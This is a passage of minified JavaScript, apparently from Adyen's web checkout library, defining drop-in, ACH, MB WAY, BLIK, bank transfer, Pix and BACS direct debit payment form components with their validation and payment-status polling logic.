adyen-checkout__dropin--"+a.type},c&&a.props.component&&a.props.component.render(),l&&a.props&&a.props.component&&a.props.component.render(),i&&!!i.length&&Hl(jm,{isLoading:l||c,isDisabling:this.state.isDisabling,paymentMethods:i,activePaymentMethod:o,cachedPaymentMethods:s,order:this.props.order,orderStatus:this.state.orderStatus,onOrderCancel:this.props.onOrderCancel,onSelect:this.handleOnSelectPaymentMethod,openFirstPaymentMethod:this.props.openFirstPaymentMethod,openFirstStoredPaymentMethod:this.props.openFirstStoredPaymentMethod,onDisableStoredPaymentMethod:this.handleDisableStoredPaymentMethod,showRemovePaymentMethodButton:this.props.showRemovePaymentMethodButton}))}},t}(Gl),Hm=["androidpay","samsungpay"],Vm=function(e){return!Hm.includes(e.constructor.type)},Qm=function(e){return!!e},Gm=function(e){if(e.isAvailable){var t=new Promise((function(e,t){return setTimeout(t,5e3)}));return Promise.race([e.isAvailable(),t])}return Promise.resolve(!!e)},Wm=function(e,t,n){void 0===e&&(e=[]);var r=e.map((function(e){return n(e,t)})).filter(Qm).filter(Vm),i=r.map(Gm).map((function(e){return e.catch((function(e){return e}))}));return Promise.all(i).then((function(e){return r.filter((function(t,n){return!0===e[n]}))}))},Km=function(e){function t(t){var n=e.call(this,t)||this;return n.dropinRef=null,n.handleSubmit=function(){var e=n.activePaymentMethod,t=e.data,r=e.isValid;return r?(!1!==n.props.setStatusAutomatically&&n.setStatus("loading"),n.props.onSubmit({data:t,isValid:r},n)):(n.showValidation(),!1)},n.handleCreate=function(){var e,t,r,i,a=n.props,o=a.paymentMethods,s=a.storedPaymentMethods,l=a.showStoredPaymentMethods,c=a.showPaymentMethods,u=a._parentInstance,d={elementRef:(e=ml(ml({},n.props),{elementRef:n.elementRef})).elementRef,showPayButton:e.showPayButton,isDropin:!0};return[l?(t=s,r=d,i=null==u?void 0:u.create,void 0===t&&(t=[]),Wm(t,ml(ml({},r),{oneClick:!0}),i)):[],c?Wm(o,d,null==u?void 0:u.create):[]]},n.submit=n.submit.bind(n),n}return Al(t,e),Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.dropinRef&&!!this.dropinRef.state.activePaymentMethod&&!!this.dropinRef.state.activePaymentMethod.isValid},enumerable:!1,configurable:!0}),t.prototype.showValidation=function(){return this.dropinRef.state.activePaymentMethod&&this.dropinRef.state.activePaymentMethod.showValidation(),this},t.prototype.setStatus=function(e,t){var n;return void 0===t&&(t={}),null===(n=this.dropinRef)||void 0===n||n.setStatus({type:e,props:t}),this},Object.defineProperty(t.prototype,"activePaymentMethod",{get:function(){var e,t;return(null===(e=this.dropinRef)||void 0===e?void 0:e.state)||(null===(t=this.dropinRef)||void 0===t?void 0:t.state.activePaymentMethod)?this.dropinRef.state.activePaymentMethod:null},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"data",{get:function(){return this.activePaymentMethod?this.dropinRef.state.activePaymentMethod.data:null},enumerable:!1,configurable:!0}),t.prototype.submit=function(){var e=this;if(!this.activePaymentMethod)throw new Error("No active payment method.");this.activePaymentMethod.startPayment().then(this.handleSubmit).catch((function(t){return e.props.onError(t)}))},t.prototype.handleAction=function(e,t){var n,r=this;if(void 0===t&&(t={}),!e||!e.type)throw new Error("Invalid Action");if(null===(n=this.activePaymentMethod)||void 0===n?void 0:n.updateWithAction)return this.activePaymentMethod.updateWithAction(e);var i=this.props._parentInstance.createFromAction(e,ml(ml({},t),{elementRef:this.elementRef,onAdditionalDetails:function(e){return r.props.onAdditionalDetails(e,r.elementRef)},isDropin:!0}));return i?this.setStatus(i.props.statusType,{component:i}):null},t.prototype.closeActivePaymentMethod=function(){this.dropinRef.closeActivePaymentMethod()},t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(zm,ml({},this.props,{onChange:this.setState,onSubmit:this.handleSubmit,elementRef:this.elementRef,onCreateElements:this.handleCreate,ref:function(t){e.dropinRef=t}})))},t.type="dropin",t.defaultProps=Pm,t}(Zc),qm="AchInput-module_adyen-checkout__input__1SeSl",Xm=function(e){var t,n=e.id,r=e.dataInfo,i=e.className,a=void 0===i?"":i,o=e.label,s=e.focused,l=e.filled,c=e.errorMessage,u=void 0===c?"":c,d=e.isValid,p=void 0!==d&&d,h=e.onFocusField,f=e.dir,A="encrypted"+(n.charAt(0).toUpperCase()+n.slice(1));return Hl(mu,{label:o,focused:s,filled:l,classNameModifiers:[n],onFocusField:function(){return h(A)},errorMessage:u,isValid:p,className:a,dir:f},Hl("span",{"data-cse":A,"data-info":r,className:Cc((t={"adyen-checkout__input":!0,"adyen-checkout__input--large":!0},t[qm]=!0,t["adyen-checkout__input--error"]=u.length,t["adyen-checkout__input--focus"]=s,t["adyen-checkout__input--valid"]=p,t))}))},Ym=function(e){var t=e.focusedElement,n=e.onFocusField,r=e.errors,i=e.valid,a=Xc().i18n;return Hl("div",{className:"adyen-checkout__ach-sf__form adyen-checkout__field-wrapper"},Hl(Xm,{id:"bankAccountNumber",focused:"encryptedBankAccountNumber"===t,isValid:!!i.encryptedBankAccountNumber,label:a.get("ach.accountNumberField.title"),onFocusField:n,filled:!!r.encryptedBankAccountNumber||!!i.encryptedBankAccountNumber,errorMessage:!!r.encryptedBankAccountNumber&&a.get("ach.accountNumberField.invalid"),dataInfo:'{"length":"4-17", "maskInterval": 4}',className:"adyen-checkout__field--50",dir:"ltr"}),Hl(Xm,{id:"bankLocationId",focused:"encryptedBankLocationId"===t,isValid:!!i.encryptedBankLocationId,label:a.get("ach.accountLocationField.title"),onFocusField:n,filled:!!r.encryptedBankLocationId||!!i.encryptedBankLocationId,errorMessage:!!r.encryptedBankLocationId&&a.get("ach.accountLocationField.invalid"),dataInfo:'{"length":9}',className:"adyen-checkout__field--50",dir:"ltr"}))},Jm={base:{caretColor:"#0066FF"}};function Zm(e,t){return void 0===t&&(t=!1),!t||!!e&&"string"==typeof e&&0<e.trim().length}function ev(e){var t=this,n=Xc().i18n,r=e.hasHolderName&&(e.holderName||e.data.holderName),i=Fc({}),a=i[0],o=i[1],s=Fc(ml({},e.holderNameRequired&&{holderName:r})),l=s[0],c=s[1],u=Fc(ml({},e.hasHolderName&&{holderName:e.holderName||e.data.holderName})),d=u[0],p=u[1],h=Fc(e.billingAddressRequired?e.data.billingAddress:null),f=h[0],A=h[1],m=Fc(!1),v=m[0],g=m[1],y=Fc(""),b=y[0],_=y[1],w=function(e){A(ml(ml({},f),e.data)),c(ml(ml({},l),{billingAddress:e.isValid}))},C=function(t){var n=t.target.value;p(ml(ml({},d),{holderName:n})),o(ml(ml({},a),{holderName:!!e.holderNameRequired&&!Zm(n)})),c(ml(ml({},l),{holderName:!e.holderNameRequired||Zm(n,e.holderNameRequired)}))},x=Dc(null),S=Dc(null),k=Fc("ready"),M=k[0],B=k[1];return this.setStatus=function(e){B(e)},this.showValidation=function(){x.current.showValidation(),e.holderNameRequired&&!l.holderName&&o(ml(ml({},a),{holderName:!0})),S.current&&S.current.showValidation()},Oc((function(){return t.setFocusOn=x.current.setFocusOn,t.updateStyles=x.current.updateStyles,function(){x.current.destroy()}}),[]),Oc((function(){var t=Zm(d.holderName,e.holderNameRequired),n=v,r=!e.billingAddressRequired||Boolean(l.billingAddress),i=n&&t&&r;e.onChange({data:d,isValid:i,billingAddress:f})}),[d,l,a]),Hl("div",{className:"adyen-checkout__ach"},Hl(Wh,ml({ref:x},e,{styles:ml(ml({},Jm),e.styles),onChange:function(t){var n=t,r=n.autoCompleteName?n.autoCompleteName:d.holderName;p(ml(ml(ml({},d),n.data),{holderName:r})),o(ml(ml({},a),n.errors)),c(ml(ml(ml({},l),n.valid),{holderName:!e.holderNameRequired||Zm(r,e.holderNameRequired)})),g(n.isSfpValid)},onFocus:function(t){var n=!0===t.focus;_(t.currentFocusObject),n?e.onFocus(t):e.onBlur(t)},render:function(t,r){var i=t.setRootNode,o=t.setFocusOn;return Hl("div",{ref:i,className:"adyen-checkout__ach-input AchInput-module_sf-input__wrapper__1V7mk"},Hl(Xh,{status:r.status},Hl("div",{className:Cc(["adyen-checkout__fieldset","adyen-checkout__fieldset--ach"])},Hl("div",{className:"adyen-checkout__fieldset__title"},n.get("ach.bankAccount")),e.hasHolderName&&Hl(mu,{label:n.get("ach.accountHolderNameField.title"),className:"adyen-checkout__pm__holderName",errorMessage:!!a.holderName&&n.get("ach.accountHolderNameField.invalid"),isValid:!!l.holderName},Lu("text",{className:"adyen-checkout__pm__holderName__input "+qm,placeholder:e.placeholders.holderName||n.get("ach.accountHolderNameField.placeholder"),value:d.holderName,required:e.holderNameRequired,onInput:C})),Hl(Ym,{focusedElement:b,onFocusField:o,errors:r.errors,valid:r.valid})),e.billingAddressRequired&&Hl(Gd,{label:"billingAddress",data:f,onChange:w,allowedCountries:e.billingAddressAllowedCountries,requiredFields:e.billingAddressRequiredFields,ref:S})))}})),e.showPayButton&&e.payButton({status:M,label:n.get("confirmPurchase")}))}ev.defaultProps={details:[],type:"ach",hasHolderName:!0,holderNameRequired:!0,billingAddressRequired:!0,billingAddressAllowedCountries:["US","PR"],onLoad:function(){},onConfigSuccess:function(){},onAllValid:function(){},onFieldValid:function(){},onBrand:function(){},onError:function(){},onBinValue:function(){},onBlur:function(){},onFocus:function(){},onChange:function(){},holderName:"",data:{holderName:"",billingAddress:{}},styles:{},placeholders:{}};var tv=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(e){var t;return ml(ml({},e),{holderNameRequired:null!==(t=e.hasHolderName)&&void 0!==t?t:e.holderNameRequired})},t.prototype.formatData=function(){var e,n=ml(ml({type:t.type},this.state.data),{ownerName:null===(e=this.state.data)||void 0===e?void 0:e.holderName});return delete n.holderName,ml({paymentMethod:n},this.state.billingAddress&&{billingAddress:this.state.billingAddress})},t.prototype.updateStyles=function(e){return this.componentRef&&this.componentRef.updateStyles&&this.componentRef.updateStyles(e),this},t.prototype.setFocusOn=function(e){return this.componentRef&&this.componentRef.setFocusOn&&this.componentRef.setFocusOn(e),this},Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"displayName",{get:function(){return this.props.name},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(ev,ml({ref:function(t){e.componentRef=t}},this.props,{onChange:this.setState,onSubmit:this.submit,payButton:this.payButton})))},t.type="ach",t}(Zc),nv=/^[+]*[0-9]{1,4}[\s/0-9]*$/;function rv(e){var t=Xc().i18n,n=Hu({schema:["telephoneNumber"],defaultData:e.data,rules:{telephoneNumber:{validate:function(e){return nv.test(e)&&7<=e.length},errorMessage:"mobileNumber.invalid",modes:["blur"]}},formatters:{telephoneNumber:function(e){return e.replace(/[^0-9+\s]/g,"")}}}),r=n.handleChangeFor,i=n.triggerValidation,a=n.data,o=n.valid,s=n.errors,l=n.isValid,c=Fc("ready"),u=c[0],d=c[1];return this.setStatus=d,this.showValidation=i,Oc((function(){e.onChange({data:a,valid:o,errors:s,isValid:l})}),[a,o,s,l]),Hl("div",{className:"adyen-checkout__mb-way"},Hl(mu,{errorMessage:!!s.telephoneNumber&&t.get("mobileNumber.invalid"),label:t.get("mobileNumber"),className:Cc("adyen-checkout__input--phone-number"),isValid:o.telephoneNumber,dir:"ltr"},Lu("tel",{value:a.telephoneNumber,className:"adyen-checkout__pm__phoneNumber__input",placeholder:e.placeholders.telephoneNumber,required:!0,autoCorrect:"off",onChange:r("telephoneNumber","blur"),onInput:r("telephoneNumber","input")})),e.showPayButton&&e.payButton({status:u,label:t.get("confirmPurchase")}))}function iv(e){var t=this,n=Xc(),r=n.i18n,i=n.loadingContext,a=Fc(!1),o=a[0],s=a[1],l=Fc(!1),c=l[0],u=l[1],d=Fc(!0),p=d[0],h=d[1],f=Fc(e.delay),A=f[0],m=f[1],v=Fc(100),g=v[0],y=v[1],b=Fc(0),_=b[0],w=b[1],C=Fc(!1),x=C[0],S=C[1],k=Fc(null),M=k[0],B=k[1],E=function(){GA(e.paymentData,e.clientKey,i).then(KA).catch((function(e){var n=e.message,r=vl(e,["message"]);return{type:"network-error",props:ml(ml({},n&&{message:t.props.i18n.get(n)}),r)}})).then((function(n){switch(n.type){case"success":!function(n){s(!0);var r={data:{details:{payload:n.props.payload},paymentData:e.paymentData}};e.onComplete(r,t)}(n);break;case"error":!function(n){u(!0);var r={data:{details:{payload:n.props.payload},paymentData:e.paymentData}};e.onComplete(r,t)}(n);break;default:h(!1)}}))};Oc((function(){var n=e.shouldRedirectOnMobile,r=e.url,i=window.matchMedia("(max-width: 768px)").matches&&/Android|iPhone|iPod/.test(navigator.userAgent);return n&&r&&i?t.redirectToApp(r,E):E(),function(){clearTimeout(M)}}),[]),Oc((function(){return c||o?clearTimeout(M):void(p||B(setTimeout((function(){E();var t=_+A;w(t),t>=e.throttleTime&&!x&&(m(e.throttleInterval),S(!0))}),A)))}),[p,_,c,o]);var T=function(e,t){return Hl("div",{className:"adyen-checkout__await adyen-checkout__await--result"},Hl("img",{className:"adyen-checkout__await__icon adyen-checkout__await__icon--result",src:gc({loadingContext:i,imageFolder:"components/"})(e),alt:r.get(t)}),Hl("div",{className:"adyen-checkout__await__subtitle adyen-checkout__await__subtitle--result"},r.get(t)))};if(c)return T("error","error.subtitle.payment");if(o)return T("success","creditCard.success");if(p)return Hl("div",{className:"adyen-checkout__await"},e.brandLogo&&Hl("img",{src:e.brandLogo,alt:e.type,className:"adyen-checkout__await__brand-logo"}),Hl(xc,{inline:!1,size:"large"}));var P=r.get("wechatpay.timetopay").split("%@");return Hl("div",{className:Cc("adyen-checkout__await","adyen-checkout__await--"+e.type,e.classNameModifiers.map((function(e){return"adyen-checkout__await--"+e})))},e.brandLogo&&Hl("img",{src:e.brandLogo,alt:e.type,className:"adyen-checkout__await__brand-logo"}),Hl("div",{className:"adyen-checkout__await__subtitle"},e.messageText),Hl("div",{className:"adyen-checkout__await__indicator-holder"},Hl("div",{className:"adyen-checkout__await__indicator-spinner"},Hl(xc,{inline:!1,size:"medium"})),Hl("div",{className:"adyen-checkout__await__indicator-text"},e.awaitText)),e.showCountdownTimer&&Hl("div",{className:"adyen-checkout__await__countdown-holder"},Hl("div",{className:"adyen-checkout__await__progress"},Hl("span",{className:"adyen-checkout__await__percentage",style:{width:g+"%"}})),Hl("div",{className:"adyen-checkout__await__countdown"},P[0]," ",Hl(QA,{minutesFromNow:e.countdownTime,onTick:function(e){y(e.percentage)},onCompleted:function(){u(!0),clearTimeout(M),e.onError({type:"error",props:{errorMessage:"Payment Expired"}},t)}})," ",P[1])),e.url&&Hl("div",{className:"adyen-checkout__await__app-link"},Hl("span",{className:"adyen-checkout__await__separator__label"},r.get("or")),Hl(Yc,{classNameModifiers:["await"],onClick:function(){return n=e.url,void 0===r&&(r=function(){}),setTimeout((function(){var n=e.type+" App was not found";e.onError(n,t),r()}),25),void window.location.assign(n);var n,r},label:r.get("openApp")})))}rv.defaultProps={onChange:function(){}},iv.defaultProps={countdownTime:15,onError:function(){},onComplete:function(){},throttleTime:6e4,throttleInterval:1e4,showCountdownTimer:!0,classNameModifiers:[],shouldRedirectOnMobile:!1,url:null};var av=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(e){var t=e.data,n=void 0===t?{}:t,r=e.placeholders,i=void 0===r?{}:r;return ml(ml({},e),{data:{telephoneNumber:n.telephoneNumber||n.phoneNumber},placeholders:{telephoneNumber:i.telephoneNumber||i.phoneNumber||"+351 932 123 456"}})},t.prototype.formatData=function(){var e;return{paymentMethod:ml({type:t.type},(null===(e=this.state.data)||void 0===e?void 0:e.telephoneNumber)&&{telephoneNumber:this.state.data.telephoneNumber})}},Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"displayName",{get:function(){return this.props.name},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return this.props.paymentData?Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(iv,{ref:function(t){e.componentRef=t},clientKey:this.props.clientKey,paymentData:this.props.paymentData,onError:this.props.onError,onComplete:this.onComplete,brandLogo:this.icon,type:"mbway",messageText:this.props.i18n.get("mbway.confirmPayment"),awaitText:this.props.i18n.get("await.waitForConfirmation"),showCountdownTimer:!1,delay:2e3,countdownTime:15,throttleTime:6e4,throttleInterval:1e4})):Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(rv,ml({ref:function(t){e.componentRef=t}},this.props,{onChange:this.setState,onSubmit:this.submit,payButton:this.payButton})))},t.type="mbway",t}(Zc);function ov(e){var t=this,n=Xc(),r=n.i18n,i=n.loadingContext,a=Hu({schema:["blikCode"],rules:{blikCode:{validate:function(e){return 6===(null==e?void 0:e.length)},errorMessage:"blik.invalid",modes:["blur"]}}}),o=a.handleChangeFor,s=a.triggerValidation,l=a.data,c=a.valid,u=a.errors,d=a.isValid;Oc((function(){e.onChange({data:l,errors:u,valid:c,isValid:d},t)}),[l,c,u,d]);var p=Fc("ready"),h=p[0],f=p[1];return this.setStatus=f,this.showValidation=s,Hl("div",{className:"adyen-checkout__blik"},Hl("p",{className:"adyen-checkout__blik__helper"},r.get("blik.help")),Hl(mu,{errorMessage:!!u.blikCode&&r.get(u.blikCode.errorMessage),label:r.get("blik.code"),classNameModifiers:["blikCode","50"],isValid:c.blikCode,dir:"ltr"},Lu("text",{value:l.blikCode,name:"blikCode",spellcheck:!1,required:!0,autocorrect:"off",onInput:o("blikCode","input"),onChange:o("blikCode","blur"),placeholder:"123456",maxLength:6})),e.showPayButton&&e.payButton({status:h,icon:gc({loadingContext:i,imageFolder:"components/"})("lock")}))}ov.defaultProps={data:{blikCode:""}};var sv=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatData=function(){var e=!!this.props.storedPaymentMethodId;return{paymentMethod:ml(ml({type:t.type},!e&&{blikCode:this.state.data.blikCode}),e&&{storedPaymentMethodId:this.props.storedPaymentMethodId})}},Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.props.storedPaymentMethodId||!!this.state.isValid},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return this.props.paymentData?Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(iv,{ref:function(t){e.componentRef=t},clientKey:this.props.clientKey,paymentData:this.props.paymentData,onError:this.props.onError,onComplete:this.onComplete,brandLogo:this.icon,type:"blik",messageText:this.props.i18n.get("blik.confirmPayment"),awaitText:this.props.i18n.get("await.waitForConfirmation"),showCountdownTimer:!1,delay:2e3,countdownTime:15,throttleTime:6e4,throttleInterval:1e4})):Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},this.props.storedPaymentMethodId?Hl(Pf,{name:this.displayName,amount:this.props.amount,payButton:this.payButton,onSubmit:this.submit,ref:function(t){e.componentRef=t}}):Hl(ov,ml({ref:function(t){e.componentRef=t}},this.props,{onChange:this.setState,onSubmit:this.submit,payButton:this.payButton})))},t.type="blik",t}(Zc);function lv(e){var t=e.reference,n=e.totalAmount,r=e.paymentMethodType,i=Xc(),a=i.loadingContext,o=i.i18n;return Hl(Vf,{paymentMethodType:r,introduction:o.get("bankTransfer.instructions"),imageUrl:gc({loadingContext:a})(r),amount:n&&o.amount(n.value,n.currency),voucherDetails:[{label:o.get("bankTransfer.beneficiary"),value:e.beneficiary},{label:o.get("bankTransfer.iban"),value:e.iban},{label:o.get("bankTransfer.bic"),value:e.bic},{label:o.get("bankTransfer.reference"),value:t}]})}function cv(e){var t=Xc().i18n,n=Fc(!1),r=n[0],i=n[1],a=Hu({schema:[],defaultData:e.data}),o=a.handleChangeFor,s=a.triggerValidation,l=a.data,c=a.valid,u=a.errors,d=a.isValid,p=a.setSchema;return Oc((function(){p(r?["shopperEmail"]:[])}),[r]),this.showValidation=s,Oc((function(){e.onChange({data:l,errors:u,valid:c,isValid:d})}),[l,c,u,r,d]),Hl("div",{className:"adyen-checkout__bankTransfer"},Hl("p",{className:"adyen-checkout__bankTransfer__introduction"},t.get("bankTransfer.introduction")),Hl(dm,{classNames:"adyen-checkout__bankTransfer__emailField",value:l.shopperEmail,errors:u.shopperEmail,onToggle:function(){return i(!r)},onInput:o("shopperEmail","input"),onChange:o("shopperEmail","blur")}))}var uv=function(e){function t(){var t=null!==e&&e.apply(this,arguments)||this;return t.state={isValid:!t.props.showEmailAddress,data:{}},t.handleRef=function(e){t.componentRef=e},t}return Al(t,e),Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),t.prototype.formatData=function(){var e=this.state.data.shopperEmail;return ml({paymentMethod:{type:t.type}},e&&{shopperEmail:e})},t.prototype.render=function(){return this.props.reference?Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(lv,ml({ref:this.handleRef},this.props))):this.props.showPayButton?Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},this.props.showEmailAddress&&Hl(cv,ml({ref:this.handleRef},this.props,{onChange:this.setState})),Hl(Pf,ml({},this.props,{name:this.displayName,onSubmit:this.submit,payButton:this.payButton}))):null},t.type="bankTransfer_IBAN",t.defaultProps={showPayButton:!0,showEmailAddress:!0},t}(Zc),dv=["CA","US"],pv=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml(ml({},e.prototype.formatProps.call(this,t)),{allowedCountries:dv,personalDetailsRequiredFields:["firstName","lastName","telephoneNumber","shopperEmail"]})},t.type="affirm",t}(Yd),hv=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml({delay:2e3,countdownTime:15,copyBtn:!0,introduction:"pix.instructions"},e.prototype.formatProps.call(this,t))},t.type="pix",t}(XA),fv=/^(\d){1,8}$/,Av=/^(\d){6}$/,mv=/[^0-9]/g,vv={bankAccountNumber:{modes:["blur","input"],validate:function(e){return!!e&&fv.test(e)}},bankLocationId:[{modes:["input"],validate:function(e){return!!e&&/^(\d){1,6}$/.test(e)}},{modes:["blur"],validate:function(e){return!!e&&Av.test(e)}}],amountConsentCheckbox:{modes:["blur"],validate:function(e){return!!e}},accountConsentCheckbox:{modes:["blur"],validate:function(e){return!!e}},default:{modes:["blur"],validate:function(e){return!!e&&0<e.length}}},gv={bankAccountNumber:function(e){return e.replace(mv,"")},bankLocationId:function(e){return e.replace(mv,"")}},yv="enter-data",bv="confirm-data";function _v(e){var t,n,r=this,i=Xc().i18n,a=Hu({schema:["holderName","bankAccountNumber","bankLocationId","shopperEmail","amountConsentCheckbox","accountConsentCheckbox"],defaultData:e.data,formatters:gv,rules:vv}),o=a.handleChangeFor,s=a.triggerValidation,l=a.data,c=a.valid,u=a.errors,d=a.isValid,p=Fc(yv),h=p[0],f=p[1];return this.setStatus=f,this.showValidation=s,Oc((function(){e.onChange({data:l,valid:c,errors:u,isValid:d})}),[l,c,u,d]),Hl("div",{className:Cc({"adyen-checkout__bacs":!0,"adyen-checkout__bacs--confirm":h===bv||"loading"===h})},h==bv&&Hl("div",{className:Cc({"adyen-checkout__bacs--edit":!0,"adyen-checkout__bacs--edit-dropin":e.isDropin})},Lu("text",{name:"bacsEdit",className:"adyen-checkout__bacs--edit-button",value:i.get("edit"),"aria-label":i.get("edit"),readonly:!0,onClick:function(){return r.setStatus(yv)}})),Hl(mu,{className:Cc({"adyen-checkout__bacs--holder-name":!0,"adyen-checkout__field--inactive":h===bv||"loading"===h}),label:i.get("bacs.accountHolderName"),errorMessage:!!u.holderName&&i.get("bacs.accountHolderName.invalid"),isValid:c.holderName},Lu("text",{name:"bacs.accountHolderName",className:"adyen-checkout__bacs-input--holder-name",placeholder:e.placeholders.holderName,value:l.holderName,"aria-invalid":!c.holderName,"aria-label":i.get("bacs.accountHolderName"),"aria-required":"true",required:!0,readonly:h===bv||"loading"===h,autocorrect:"off",onChange:o("holderName","blur"),onInput:o("holderName","input")})),Hl("div",{className:"adyen-checkout__bacs__num-id adyen-checkout__field-wrapper"},Hl(mu,{errorMessage:!!u.bankAccountNumber&&i.get("bacs.accountNumber.invalid"),label:i.get("bacs.accountNumber"),className:Cc({"adyen-checkout__bacs--bank-account-number":!0,"adyen-checkout__field--inactive":h===bv||"loading"===h}),classNameModifiers:["col-70"],isValid:c.bankAccountNumber},Lu("text",{value:l.bankAccountNumber,className:"adyen-checkout__bacs-input--bank-account-number",placeholder:e.placeholders.bankAccountNumber,"aria-invalid":!c.bankAccountNumber,"aria-label":i.get("bacs.accountNumber"),"aria-required":"true",required:!0,readonly:h===bv||"loading"===h,autocorrect:"off",onChange:o("bankAccountNumber","blur"),onInput:o("bankAccountNumber","input")})),Hl(mu,{errorMessage:!!u.bankLocationId&&i.get("bacs.bankLocationId.invalid"),label:i.get("bacs.bankLocationId"),className:Cc({"adyen-checkout__bacs--bank-location-id":!0,"adyen-checkout__field--inactive":h===bv||"loading"===h}),classNameModifiers:["col-30"],isValid:c.bankLocationId},Lu("text",{value:l.bankLocationId,className:"adyen-checkout__bacs-input--bank-location-id",placeholder:e.placeholders.bankLocationId,"aria-invalid":!c.bankLocationId,"aria-label":i.get("bacs.bankLocationId"),"aria-required":"true",required:!0,readonly:h===bv||"loading"===h,autocorrect:"off",onChange:o("bankLocationId","blur"),onInput:o("bankLocationId","input")}))),Hl(mu,{errorMessage:!!u.shopperEmail&&i.get("shopperEmail.invalid"),label:i.get("shopperEmail"),className:Cc({"adyen-checkout__bacs--shopper-email":!0,"adyen-checkout__field--inactive":h===bv||"loading"===h}),isValid:c.shopperEmail},Lu("emailAddress",{value:l.shopperEmail,name:"shopperEmail",className:"adyen-checkout__bacs-input--shopper-email",classNameModifiers:["large"],placeholder:e.placeholders.shopperEmail,spellcheck:!1,"aria-invalid":!c.shopperEmail,"aria-label":i.get("shopperEmail"),"aria-required":"true",required:!0,readonly:h===bv||"loading"===h,autocorrect:"off",onInput:o("shopperEmail","input"),onChange:o("shopperEmail","blur")})),h===yv&&Hl(Wd,{classNameModifiers:["amountConsentCheckbox"],errorMessage:!!u.amountConsentCheckbox,label:i.get("bacs.consent.amount"),onChange:o("amountConsentCheckbox"),checked:!!l.amountConsentCheckbox}),h===yv&&Hl(Wd,{classNameModifiers:["accountConsentCheckbox"],errorMessage:!!u.accountConsentCheckbox,label:i.get("bacs.consent.account"),onChange:o("accountConsentCheckbox"),checked:!!l.accountConsentCheckbox}),e.showPayButton&&e.payButton({status:h,label:h===yv?i.get("continue"):i.get("bacs.confirm")+" "+((null===(t=e.amount)||void 0===t?void 0:t.value)&&(null===(n=e.amount)||void 0===n?void 0:n.currency)?i.amount(e.amount.value,e.amount.currency):""),icon:gc({loadingContext:e.loadingContext,imageFolder:"components/"})("lock"),onClick:function(){return d?h===yv?r.setStatus(bv):h===bv?e.onSubmit():void 0:r.showValidation()}}))}_v.defaultProps={data:{},placeholders:{}};var wv=function(e){var t=Xc(),n=t.i18n,r=t.loadingContext,i=e.url,a=e.paymentMethodType;return Hl(Vf,{paymentMethodType:a,introduction:n.get("bacs.result.introduction"),imageUrl:gc({loadingContext:r})(a),downloadUrl:i,downloadButtonText:n.get("download.pdf")})},Cv=function(e){function t(){var t=null!==e&&e.apply(this,arguments)||this;return t.payButton=function(e){return Hl(Jc,ml({amount:t.props.amount,onClick:t.submit},e))},t}return Al(t,e),t.prototype.formatData=function(){var e,n,r,i;return ml({paymentMethod:ml(ml(ml({type:t.type},(null===(e=this.state.data)||void 0===e?void 0:e.holderName)&&{holderName:this.state.data.holderName}),(null===(n=this.state.data)||void 0===n?void 0:n.bankAccountNumber)&&{bankAccountNumber:this.state.data.bankAccountNumber}),(null===(r=this.state.data)||void 0===r?void 0:r.bankLocationId)&&{bankLocationId:this.state.data.bankLocationId})},(null===(i=this.state.data)||void 0===i?void 0:i.shopperEmail)&&{shopperEmail:this.state.data.shopperEmail})},Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},this.props.url?Hl(wv,{ref:function(t){e.componentRef=t},icon:this.icon,url:this.props.url,paymentMethodType:this.props.paymentMethodType}):Hl(_v,ml({ref:function(t){e.componentRef=t}},this.props,{onChange:this.setState,payButton:this.payButton,onSubmit:this.submit})))},t.type="directdebit_GB",t}(Zc),xv={dropin:Km,ach:tv,address:function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),Object.defineProperty(t.prototype,"data",{get:function(){return this.state.data},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return 